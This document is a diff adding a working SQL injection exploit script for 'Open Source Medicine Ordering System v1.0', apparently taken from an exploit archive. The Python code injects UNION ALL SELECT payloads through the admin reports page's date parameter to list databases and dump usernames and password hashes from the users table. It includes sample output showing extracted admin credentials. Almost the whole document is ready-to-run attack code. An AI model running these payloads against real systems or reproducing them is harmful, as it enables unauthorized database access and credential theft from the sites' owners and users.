@@ -1,0 +1,91 @@
+id: 39536
+date: 04/08/2024
+title: Open Source Medicine Ordering System v1.0 - SQL injection Exploit
+author: Onur Karasalihoğlu
+cves: 
+
+# Exploit Title : Open Source Medicine Ordering System v1.0 - SQLi
+# Author : Onur Karasalihoğlu
+# Sample Usage
+
+% python3 omos_sqli_exploit.py https://target.com
+Available Databases:
+1. information_schema
+2. omosdb
+Please select a database to use (enter number): 2
+You selected: omosdb
+Extracted Admin Users Data:
+1 | Adminstrator | Admin |  | 0192023a7bbd73250516f069df18b500 | admin
+2 | John | Smith | D | 1254737c076cf867dc53d60a0364f38e | jsmith
+'''
+
+import requests
+import re
+import sys
+
+def fetch_database_names(domain):
+    url = f"{domain}/admin/?page=reports&date=2024-02-22'%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,CONCAT('enforsec',JSON_ARRAYAGG(CONCAT_WS(',',schema_name)),'enforsec')%20FROM%20INFORMATION_SCHEMA.SCHEMATA--%20-"
+    
+    try:
+        # HTTP request
+        response = requests.get(url)
+        response.raise_for_status()  # exception for 4xx and 5xx requests
+        
+        # data extraction
+        pattern = re.compile(r'enforsec\["(.*?)"\]enforsec')
+        extracted_data = pattern.search(response.text)
+        if extracted_data:
+            databases = extracted_data.group(1).split(',')
+            databases = [db.replace('"', '') for db in databases]
+            print("Available Databases:")
+            for i, db in enumerate(databases, start=1):
+                print(f"{i}. {db}")
+            
+            # users should select omos database
+            choice = int(input("Please select a database to use (enter number): "))
+            if 0 < choice <= len(databases):
+                selected_db = databases[choice - 1]
+                print(f"You selected: {selected_db}")
+                fetch_data(domain, selected_db)
+            else:
+                print("Invalid selection.")
+        else:
+            print("No data extracted.")
+    except requests.RequestException as e:
+        print(f"HTTP Request failed: {e}")
+
+def fetch_data(domain, database_name):
+    url = f"{domain}/admin/?page=reports&date=2024-02-22'%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,CONCAT('enforsec',JSON_ARRAYAGG(CONCAT_WS(',',`type`,firstname,lastname,middlename,password,username)),'enforsec') FROM {database_name}.users-- -"
+    
+    try:
+        # HTTP request
+        response = requests.get(url)
+        response.raise_for_status()  # exception for 4xx and 5xx requests
+        
+        # data extraction
+        pattern = re.compile(r'enforsec\[(.*?)\]enforsec')
+        extracted_data = pattern.search(response.text)
+        if extracted_data:
+            print("Extracted Admin Users Data:")
+            data = extracted_data.group(1)
+            rows = data.split('","')
+            for row in rows:
+                clean_row = row.replace('"', '')
+                user_details = clean_row.split(',')
+                print(" | ".join(user_details))
+        else:
+            print("No data extracted.")
+    except requests.RequestException as e:
+        print(f"HTTP Request failed: {e}")
+
+def main():
+    if len(sys.argv) != 2:
+        print("Usage: python3 omos_sqli_exploit.py <domain>")
+        sys.exit(1)
+
+    fetch_database_names(sys.argv[1])
+
+if __name__ == "__main__":
+    main()
+
+#  0day.today [2024-04-10]  #
